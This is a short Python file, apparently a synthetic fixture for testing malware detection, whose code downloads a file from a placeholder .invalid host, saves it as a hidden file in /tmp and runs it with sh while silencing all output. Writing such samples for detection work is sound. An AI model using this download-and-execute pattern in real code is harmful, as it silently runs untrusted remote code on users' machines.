# FIXTURE ONLY - synthetic detection test sample, not real malware
# Shape: a download is saved under a hidden name in the temp folder and started with its output
# discarded. Host is a non-existent .invalid domain.
import subprocess

import requests

payload = requests.get("https://dl.example.invalid/upd").content
open("/tmp/.upd", "wb").write(payload)
subprocess.Popen(["sh", "/tmp/.upd"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
